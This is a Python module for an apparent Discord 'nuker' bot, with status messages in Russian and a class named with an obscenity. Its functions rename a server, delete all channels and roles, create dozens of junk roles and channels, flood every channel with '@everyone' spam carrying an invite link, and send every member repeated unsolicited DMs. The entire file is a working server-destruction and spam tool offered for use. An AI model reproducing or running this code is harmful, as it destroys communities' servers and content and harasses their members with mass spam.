"""custom python functions"""

import logging
import disnake
import asyncio
from config import (
    name_category,
    name_channel,
    name_guild,
    description_guild,
    embed_crash,
    discord_link,
    role_name,
)

log = logging.getLogger(__name__)

loop = asyncio.get_event_loop()  # MAIN LOOP
loop_2 = asyncio.get_event_loop()  # SUB LOOP
loop_3 = asyncio.get_event_loop()  # ARCH LOOP
loop_4 = asyncio.get_event_loop()  # SAVE LOOP


class pizda_vsemu:
    def __init__(self) -> None:
        pass

    async def remove_all_channels(
        self, inter: disnake.Interaction
    ):
        guild = inter.guild
        channels = await guild.fetch_channels()
        for i in range(0, len(channels) - 1):
            await channels[i].delete()
            await inter.edit_original_message(content=f"Удалил {i} каналов!")
        return "End"

    async def delete_role(self, inter: disnake.Interaction):
        guild = inter.guild
        roles = await guild.fetch_roles()
        for role in roles:
            try:
                await role.delete()
            except:
                pass
        return

    async def make_role(self, inter: disnake.Interaction):
        guild = inter.guild
        for i in range(0, 50):
            try:
                await guild.create_role(
                    name=role_name,
                )
            except:
                pass
        return

    async def member_send_dm_message(self, inter: disnake.Interaction):
        guild = inter.guild
        try:
            async for member in guild.fetch_members(limit=None):
                if member.bot == False:
                    for i in range(0, 5):
                        urs = guild.get_member(member.id)
                        await urs.send(
                            content=f"<@{member.id}> {discord_link}",
                            embed=disnake.Embed.from_dict(embed_crash),
                        )
                        await asyncio.sleep(0.3)
            return
        except Exception as error:
            print(error)

    async def send_embeds(self, channel):
        for i in range(0, 20):
            await channel.send(
                content=f"@everyone {discord_link}",
                embed=disnake.Embed.from_dict(embed_crash),
            )
        return

    async def set_guild(self, inter: disnake.Interaction):
        image_path = "avatar.png"
        guild = inter.guild
        try:
            with open(image_path, "rb") as f:
                image = f.read()
            await guild.edit(icon=image, name=name_guild, description=description_guild)
            return
        except Exception as error:
            print(error)
            return

    async def make_channels(self, inter: disnake.Interaction):
        guild = inter.guild
        cg = await guild.create_category(name=name_category, position=0)
        i = 0
        while True:
            if i != 49:
                try:
                    ch = await cg.create_text_channel(name=name_channel)
                    asyncio.run_coroutine_threadsafe(
                        pizda_vsemu().send_embeds(ch), loop
                    )
                except Exception:
                    i = i + 1
                    cg = await guild.create_category(name=name_category, position=0)
            else:
                return "End"

    async def main_task(self, inter: disnake.Interaction, bot: disnake.Client):
        await pizda_vsemu().set_guild(inter)
        await inter.edit_original_message(content="Изменил сервер!")
        asyncio.run_coroutine_threadsafe(pizda_vsemu().delete_role(inter), loop_4)
        asyncio.run_coroutine_threadsafe(pizda_vsemu().make_role(inter), loop_4)
        await inter.edit_original_message(content="Пишу в личку!")
        asyncio.run_coroutine_threadsafe(
            pizda_vsemu().member_send_dm_message(inter), loop_3
        )
        asyncio.run_coroutine_threadsafe(
            pizda_vsemu().remove_all_channels(inter), loop
        )

        await inter.edit_original_message(content="Удалил каналы!")
        asyncio.run_coroutine_threadsafe(
            pizda_vsemu().make_channels(inter), loop_2
        )
